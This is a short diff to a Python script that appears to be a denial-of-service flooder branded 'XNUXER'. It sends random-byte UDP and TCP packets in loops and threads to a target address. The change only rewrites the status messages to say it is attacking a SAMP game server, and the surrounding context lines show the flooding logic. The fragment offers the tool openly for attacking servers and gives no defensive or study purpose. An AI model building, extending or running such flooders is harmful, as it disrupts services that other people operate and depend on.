@@ -35,9 +35,9 @@ def run():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +" XNUXER ATTACKING IP %s PORT %s"%(orgip,port))
+			print(i +" XNUXER ATTACKING SAMP SERVER")
 		except:
-			print("  XNUXER ATTACKING IP %s PORT %s"%(orgip,port))
+			print("[X] ERROR")
 
 def run2():
 	data = random._urandom(16)
@@ -49,10 +49,10 @@ def run2():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +"  XNUXER ATTACKING IP %s PORT %s"%(orgip,port))
+			print(i +"  XNUXER ATTACKING SAMP SERVER")
 		except:
 			s.close()
-			print("  XNUXER ATTACKING IP %s PORT %s"%(orgip,port))
+			print("[X] ERROR")
 
 for y in range(threads):
 	if choice == 'y':
